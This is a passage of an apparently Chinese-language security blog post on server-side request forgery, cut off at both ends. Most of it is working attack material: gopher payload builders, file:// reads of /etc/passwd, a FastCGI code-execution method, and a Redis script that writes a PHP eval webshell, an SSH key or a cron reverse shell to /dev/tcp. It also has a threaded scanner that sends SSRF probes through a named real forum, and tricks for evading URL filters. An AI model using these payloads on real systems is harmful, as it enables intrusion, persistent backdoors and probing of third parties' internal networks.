class="line">haha</span><br></pre></td></tr></table></figure><p>会发现接收到的消息是分行的，而且第一行只接收到了haz，k被‘吃掉’了。</p><p>所以在使用gopher协议时<strong>需要在url后加入一个任意字符</strong>才行。</p><ul><li><p>get&#x2F;post请求</p><blockquote><p>1、构造HTTP数据包</p><p>2、URL编码、替换回车换行为%0d%0a,<br>3、发送gopher协议</p></blockquote><p>注意HTTP数据包中必须要有下面四个请求头</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: 192.168.244.128</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">  </span><br><span class="line">a=khaz</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换脚本</span></span><br><span class="line">uri = <span class="string">&#x27;/flag.php&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1:80&#x27;</span></span><br><span class="line">content = <span class="string">&#x27;key=90bb4d9d9946905d6d9d68358d7c0360&#x27;</span></span><br><span class="line">content_length = <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test =<span class="string">f&quot;&quot;&quot;POST <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">  Host: <span class="subst">&#123;host&#125;</span></span></span><br><span class="line"><span class="string">  Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  Content-Length: <span class="subst">&#123;content_length&#125;</span></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  <span class="subst">&#123;content&#125;</span>&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">first = urllib.parse.quote(test)<span class="comment">#url编码</span></span><br><span class="line"></span><br><span class="line">second = first.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)<span class="comment"># \n → \r\n</span></span><br><span class="line"></span><br><span class="line">third = urllib.parse.quote(second)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;gopher://&#123;&#125;/_&#x27;</span>.<span class="built_in">format</span>(host)+third+<span class="string">&quot;%0D%0A&quot;</span> <span class="comment">#gopher协议会吃掉url后面的第一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>  例子</p><ul><li>通过命令发起</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php kali</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20220805001153033.png" alt="image-20220805001153033"></p><ul><li><p>通过curl函数发起–两次url编码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ssrf.php  windows</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="comment">//创建一个新的curl资源  </span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();  </span><br><span class="line">    <span class="comment">//设置URL和相应的选项  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);  </span><br><span class="line">    <span class="comment">//抓取URL并把它传递给浏览器  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line">    <span class="comment">//关闭curl资源，并且释放系统资源  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用通过命令发起的payload（一次url编码），发现无回显</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220805142401807.png" alt="image-20220805142401807"></p><p>再次进行url编码后发送，发现是可以回显的。</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.244</span>.<span class="number">128</span>%<span class="number">3</span>A80%<span class="number">2</span>F_POST%<span class="number">2520</span>%<span class="number">2</span>F1.php%<span class="number">2520</span>HTTP%<span class="number">2</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520192.168</span>.<span class="number">244.128</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">25206</span>%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Aa%<span class="number">253</span>Dkhaz%<span class="number">250</span>D%<span class="number">250</span>A</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20220805142614175.png" alt="image-20220805142614175"></p><h4 id="http-x2F-https"><a href="#http-x2F-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h4><p>探测Web 应用的信息情况</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>读取本地文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd    </span><br><span class="line">file:///etc/hosts     # 记录本机的或其他主机的ip及其对应主机名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">高权限</span></span><br><span class="line">file:///proc/net/arp  # 记录ARP协议内容，里面有主机的ip和mac地址</span><br><span class="line">file:///etc/network/interfaces # 大部分网络接口配置</span><br></pre></td></tr></table></figure><h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><p>探测端口服务</p><p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p><blockquote><p>dict 协议是一个在线网络字典协议，用来架设字典服务的。</p><p>它是基于TCP协议开发的，所以像 mysql 的服务，因为也是基于 tcp 协议开发，所以用 dict 协议的方式打开能强行读取一些 mysql 服务的返回内容</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;dict://localhost:3306&quot;</span>; <span class="comment">//3306端口是mysql服务</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">PS D:\phpstudy_pro\phpstudy_pro\WWW\test&gt; D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.<span class="number">3.4</span>nts/php.exe <span class="string">&quot;d:\phpstudy_pro\phpstudy_pro\WWW\test\2.php&quot;</span></span><br><span class="line"></span><br><span class="line">J</span><br><span class="line"><span class="number">5.7</span>.<span class="number">26</span>U<span class="string">&#x27;+I2J%mkwB&quot;M)7     Imysql_native_password!#08S01Got packets out of order</span></span><br></pre></td></tr></table></figure><p>可以看到5.7.26和mysql</p><p><img src="/../images/image-20220804195027985.png" alt="image-20220804195027985"></p><p>​    </p><h3 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h3><h4 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list</a></p><p><a href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><ul><li>FPM是什么</li></ul><blockquote><p>当我们的web服务器收到请求php文件的请求时，就让php-fpm把其解释(翻译)成html格式的文件(事实上php-fpm正是干这个事的)，然后我们的web服务器将翻译出来的.html文件发给浏览器。</p><p>而php-fpm能够进行翻译依靠的就是Fastcgi通信协议。</p></blockquote><p><img src="/../images/1612761214_6020c87ec0101f355f51a.png!small" alt="1612761214_6020c87ec0101f355f51a.png!small"></p><ul><li><p>漏洞成因</p><blockquote><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>fastcgi协议传输的数据其实就是PHP环境变量的一部分。</p><p>通过设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p></blockquote></li><li><p>使用条件</p><blockquote><p>PHP服务器开启fastcgi的端口9000</p><p>能够找到PHP服务器上的php文件</p></blockquote></li><li><p>利用</p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><ul><li><p>监听端口：<code>nc -lvp 9000&gt;1.txt</code></p></li><li><p>使用exp：<code>python fpm.py -c &quot;payload&quot; -p 9000 127.0.0.1 php文件路径</code></p></li><li><p>将生成的1.txt进行双url编码：<code>python 1.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+s)</span><br></pre></td></tr></table></figure></li><li><p>利用得到的结果进行攻击</p><p><img src="/../images/image-20220805192301243.png" alt="image-20220805192301243"></p></li></ul></li></ul><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><a href="https://www.freebuf.com/articles/network/280984.html">https://www.freebuf.com/articles/network/280984.html</a></p><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><p><a href="https://blog.csdn.net/qq_41384743/article/details/98211366">Redis数据库常用命令</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">redis-cli</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入命令行后</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码</span></span><br><span class="line">config get requirepass # 查看密码</span><br><span class="line">config set requirepass passwd # 设置密码</span><br><span class="line">auth passwd # 认证</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">信息</span></span><br><span class="line">info</span><br></pre></td></tr></table></figure><h5 id="redis服务器与客户端通信"><a href="#redis服务器与客户端通信" class="headerlink" title="redis服务器与客户端通信"></a>redis服务器与客户端通信</h5><p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name khaz</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;khaz&quot;</span><br></pre></td></tr></table></figure><p>对应的数据包如下，每一行都是用<code>\r\n</code>隔开的。</p><p><img src="/../images/image-20221118232305305.png" alt="image-20221118232305305"></p><h5 id="低版本情况"><a href="#低版本情况" class="headerlink" title="低版本情况"></a>低版本情况</h5><p>配合http请求</p><blockquote><p>低版本的Redis会将http请求的请求头内容作为redis命令解析</p></blockquote><h5 id="需要认证情况"><a href="#需要认证情况" class="headerlink" title="需要认证情况"></a>需要认证情况</h5><h5 id="先找到redis服务的认证密码，转到未授权情况"><a href="#先找到redis服务的认证密码，转到未授权情况" class="headerlink" title="先找到redis服务的认证密码，转到未授权情况"></a>先找到redis服务的认证密码，转到未授权情况</h5><ul><li><p>配置文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过requirepass来定位密码</span></span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis/redis.conf</span><br><span class="line">/usr/local/redis/etc/redis.conf</span><br><span class="line">/opt/redis/ect/redis.conf</span><br></pre></td></tr></table></figure></li><li><p>弱密码爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>://<span class="number">192.168</span><span class="number">.174</span><span class="number">.129</span>:<span class="number">6379</span>/AUTH passwd</span><br></pre></td></tr></table></figure><p>认证成功</p><p><img src="/../images/image-20221118222335249.png" alt="image-20221118222335249"></p><p>认证失败</p><p><img src="/../images/image-20221118222420964.png" alt="image-20221118222420964"></p></li></ul><h5 id="未授权情况"><a href="#未授权情况" class="headerlink" title="未授权情况"></a>未授权情况</h5><h5 id="配合dict协议"><a href="#配合dict协议" class="headerlink" title="配合dict协议"></a>配合dict协议</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//x.x.x.x:6379/&lt;Redis 命令&gt;</span></span><br></pre></td></tr></table></figure><h5 id="配合gopher协议"><a href="#配合gopher协议" class="headerlink" title="配合gopher协议"></a>配合gopher协议</h5><p>首先要将命令转换为RESP协议格式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, urllib.error</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.163.128&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写马</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span> <span class="comment">#写入的文件内容</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span> <span class="comment"># web目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写ssh公钥</span></span><br><span class="line">/*</span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计划任务反弹shell  系统必须为Centos，定时任务权限问题：Centos--644  Ubuntu--600</span></span><br><span class="line">/*</span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;2333&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果redis需要认证，就在cmd第一行插入认证命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">    </span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span>  <span class="comment"># &quot;/_&quot; gopher协议特性，会吃掉url后的一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h5 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h5><p><a href="https://xz.aliyun.com/t/5665#toc-10">https://xz.aliyun.com/t/5665#toc-10</a></p><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>[总结](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Request Forgery)</p><h4 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h4><p>python2脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests.packages.urllib3</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line">threads_count = <span class="number">20</span></span><br><span class="line">scheme = <span class="string">&#x27;dict&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">ip_block = <span class="string">&#x27;10.105&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WyWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,queue</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.queue.empty():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = self.queue.get_nowait()</span><br><span class="line">                content = requests.get(url, timeout=<span class="number">2.8</span>).content</span><br><span class="line">                <span class="built_in">print</span> url, <span class="string">&#x27;OPEN&#x27;</span>, <span class="built_in">len</span>(content)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):    </span><br><span class="line">        ip = <span class="string">&#x27;&#123;0&#125;.&#123;1&#125;.&#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(ip_block,c,d)</span><br><span class="line">        payload = <span class="string">&#x27;http://fuzz.wuyun.com/302.php?s=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            scheme=scheme,</span><br><span class="line">            ip=ip, </span><br><span class="line">            port=port</span><br><span class="line">            )</span><br><span class="line">        url = <span class="string">&quot;http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]&#123;payload&#125;[/img]&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            payload=payload)</span><br><span class="line">        queue.put(url)</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(threads_count):</span><br><span class="line">    threads.append(WyWorker(queue))</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>302.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="数字ip地址"><a href="#数字ip地址" class="headerlink" title="数字ip地址"></a>数字ip地址</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>.<span class="variable">$r</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:0&quot;</span>.<span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:0x&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ip地址省略形式"><a href="#ip地址省略形式" class="headerlink" title="ip地址省略形式"></a>ip地址省略形式</h4><blockquote><p>可以省略ip地址中间的0</p><p>如127.1 &#x3D;&#x3D; 127.0.0.1</p></blockquote><p><img src="/../images/image-20230328171933107.png" alt="image-20230328171933107"></p><h4 id=""><a href="#" class="headerlink" title="@,#"></a>@,#</h4><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><p><a href="http://baidu.com@khaz.top/">http://baidu.com@khaz.top</a>  &#x3D;&gt;  <a href="http://khaz.top/">http://khaz.top</a></p><blockquote><p>只解析最后一个@后面的域名</p></blockquote><p><img src="/../images/image-20220504125707388.png" alt="image-20220504125707388"></p><p><a href="http://khaz.top/#baidu.com">http://khaz.top#baidu.com</a> &#x3D;&gt; <a href="http://khaz.top/">http://khaz.top</a></p><p><img src="/../images/image-20220504153148066.png" alt="image-20220504153148066"></p><h4 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h4><p><a href="https://www.cnblogs.com/mysticbinary/p/14470551.html">DNS Rebinding漏洞原理 - Mysticbinary - 博客园</a></p><ul><li><p>知道创宇在线</p><p><a href="http://ceye.io/dns-rebinding">http://ceye.io/dns-rebinding</a></p><p><img src="/../images/image-20230319151337356.png" alt="image-20230319151337356"></p><p><img src="/../images/image-20230319151322924.png" alt="image-20230319151322924"></p></li><li><p>同一个域名绑定两条A记录。这样解析是随机的。 </p><p>自己的服务器：</p><p><img src="/../images/image-20220805221419076.png" alt="image-20220805221419076"></p><blockquote><p>需要多试几次，碰运气。</p><p>当服务器第一次解析出来是个外网ip，第二次解析出来是个内网ip的时候攻击就成功了</p></blockquote></li><li><p>自建</p><p><a href="https://xz.aliyun.com/t/7495#toc-6">https://xz.aliyun.com/t/7495#toc-6</a></p></li></ul><h4 id="本地地址不同形式"><a href="#本地地址不同形式" class="headerlink" title="本地地址不同形式"></a>本地地址不同形式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip：127.0.0.1 --&gt; 127。0。0。1</span><br><span class="line">域名：localhost</span><br><span class="line">ipv6：</span><br></pre></td></tr></table></figure><h4 id="url中的unicode欺骗"><a href="#url中的unicode欺骗" class="headerlink" title="url中的unicode欺骗"></a>url中的unicode欺骗</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ 